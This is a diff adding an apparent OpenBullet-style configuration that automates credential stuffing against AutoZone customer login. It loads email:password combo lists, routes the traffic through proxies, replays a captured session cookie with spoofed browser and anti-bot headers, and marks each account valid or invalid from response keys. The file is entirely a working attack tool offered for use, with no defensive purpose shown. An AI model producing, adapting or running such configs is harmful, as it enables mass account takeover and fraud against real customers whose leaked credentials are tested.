@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "AutoZone",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-07T10:28:22.2429356+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.autozone.com/rest/bean/atg/userprofiling/ProfileServices/authentication?atg-rest-depth=2" AutoRedirect=TRUE 
+  CONTENT "arg1=<USER>&arg2=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: JSESSIONID=b-EoNCTawOX0gcxOx_QeZy2LHGMsi2rpJopBlj8j.pr-camaro1-xl07-EStore03; NSC_xxx-bt-qspe-8443=ffffffff09c20e3045525d5f4f58455e445a4a4216cd; sr_pp2_exp=1; _sr_sp_ses.ba2a=*; mmapi.p.srv=%22ldnvwcgus03%22; mmapi.p.pd=%221408454957%7CAwAAAApVAgBTuvQOTxAAAREAAUJIhzgdAQD38%2BKNXczVSN%2FSqY1dzNVIAAAAAP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FAAZEaXJlY3QBTxABAAAAAAAAAAAA%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FBAAHsQAAvpYDOWtPEAD%2F%2F%2F%2F%2FAU8QTxD%2F%2FwEAAAEAAAAAAeuUAQAnagIAADTBAAAu%2B2tDAU8QAP%2F%2F%2F%2F8BTxBPEP%2F%2FAQAAAQAAAAABRbYBAKWeAgAA%2B9QAAGBojswITxAA%2F%2F%2F%2F%2FwFPEE8Q%2F%2F8BAAABAAAAAAFn4wEAxOECAAB5sQAAvhQKdklPEAD%2F%2F%2F%2F%2FAU8QTxD%2F%2FwEAAAEAAAAAAbCVAQAIbAIAAAAAAAAAAUU%3D%22; audience_ids=116,103,115; sr_pik_session_id=b328f48d-d30b-cc95-90d7-fdfbcb967659; sr_browser_id=7c9be9ab-17ee-4057-a1e1-f4cd4da2e94b; ROUTEID=.www-as-prod; utag_main=v_id:0163d9b11be6001336284c5423d004073004606b0086e$_sn:1$_ss:0$_st:1528367455369$ses_id:1528365652968%3Bexp-session$_pn:1%3Bexp-session$dc_visit:1$dc_event:3%3Bexp-session; _sr_sp_id.ba2a=3d845eef-1548-4197-9082-a3fa3818f593.1528365653.1.1528365657.1528365653.35f739d3-2dd6-4116-8292-38afbaf614a5; D_IID=69BF974F-2DD6-3D60-8E8D-0BB75AD9D69F; D_UID=9A18D91A-99CF-3844-BC0B-5E667C76DBF2; D_ZID=23B098C2-1B7B-32E7-BB8A-26927F5E9723; D_ZUID=F7CCA0A9-13E6-3459-84A5-85983A5DC777; D_HID=74BD8EBC-2860-3A1A-8E2D-2B81BA609FD5; D_SID=2.96.63.199:8ofG7x7s/qpKG/tld8FKEraeXSZpmZZp59Ot3Iqyrb4; AMCVS_0E3334FA53DA8C980A490D44%40AdobeOrg=1; AMCV_0E3334FA53DA8C980A490D44%40AdobeOrg=-227196251%7CMCMID%7C43975257487750679439215257700344323162%7CMCAID%7CNONE%7CMCOPTOUT-1528372857s%7CNONE; azsc_pn=az%3Adesktop%3Amyzone%3Aprofile%3Alogin; s1_evar44=5%3A00AM; s1_evar45=Thursday; s1_evar72=Weekday; azsc_lv_s=First%20Visit; s_vnum=1530399600070%26vn%3D1; s_invisit=true; s1_eVar40=D%3Ds_vi; s_cc=true; s_ppvl=%5B%5BB%5D%5D; s_ppv=az%253Adesktop%253Amyzone%253Aprofile%253Alogin%2C66%2C66%2C937%2C1366%2C637%2C1366%2C768%2C1%2CP; azsc_lv=1528365664574; s_sq=autozusprod%3D%2526c.%2526a.%2526activitymap.%2526page%253Daz%25253Adesktop%25253Amyzone%25253Aprofile%25253Alogin%2526link%253DLog%252520In%2526region%253DmyZoneLoginForm%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Daz%25253Adesktop%25253Amyzone%25253Aprofile%25253Alogin%2526pidt%253D1%2526oid%253DLog%252520In%2526oidt%253D3%2526ot%253DSUBMIT" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.autozone.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Distil-Ajax: rrtyzabbfd" 
+  HEADER "Referer: https://www.autozone.com/myzone/profile/login.jsp?myZoneLanding=myZone" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"userType\": \"MYZONE_LOYALTY_LINK_COMPLETED\"" 
+    KEY "\"redirectUrl\": \"/myzone/loggedIn.jsp\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"redirectUrl\": \"/myzone/profile/login.jsp\"," 
+    KEY "\"userType\": \"GUEST\"" 
